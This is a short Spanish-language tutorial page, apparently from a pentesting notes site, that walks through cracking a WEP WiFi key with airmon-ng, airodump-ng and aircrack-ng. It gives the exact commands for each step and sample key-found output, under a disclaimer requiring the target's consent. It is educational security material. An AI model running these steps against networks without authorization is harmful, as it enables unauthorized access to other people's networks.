
# Ataque a WEP

{% hint style="danger" %}
**Disclaimer:** Vamos a realizar ataques a redes WiFi, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">WEP Cracking</mark>&#x20;

Para lograr crackear una contraseña de una red WEP tenemos que:

* Capturar un gran número de paquetes IV´s
* Analizar los IV´s capturados y crackear la llave

### 1. Apagar adaptador wlan0

```bash
ifconfig wlan0 down
```

### 2. Iniciamos airmon-ng

```bash
sudo airmon-ng start wlan0
```

### 3. Encontrar al objetivo

```bash
sudo airodump-ng wlan0
```

<figure><img src="/files/Kg5buwIQC1FdlfycPYQN" alt=""><figcaption></figcaption></figure>

### 4. Iniciar airodump

Debemos guardar la salida con `--write`

```bash
# 4 - Iniciamos airodump-ng y guardamos la salida
sudo airodump-ng --bssid 00:E0:4C:6A:5A:F8 --channel 11 --write basic_wifi wlan0
```

<figure><img src="/files/z3x4zrvmtlgtC5LB7qxL" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Nota:** Se debe generar la mayor cantidad de tráfico posible para que aircrack lo pueda crackear
{% endhint %}

{% hint style="warning" %}
**Importante**: no debemos detener airodump-ng mientras se ejecuta aircrack
{% endhint %}

### 5. Iniciar aircrack-ng

Abrir el archivo .cap

```bash
sudo aircrack-ng basic_wifi.cap
```

<figure><img src="/files/yLegmDxotantpAVesRhK" alt=""><figcaption></figcaption></figure>

```
KEY FOUND! [12:34:56:78:90]
Password: 1234567890
```

Depende de la complejidad de las contraseñas necesitaremos más IV´s para poder desencriptarlo.
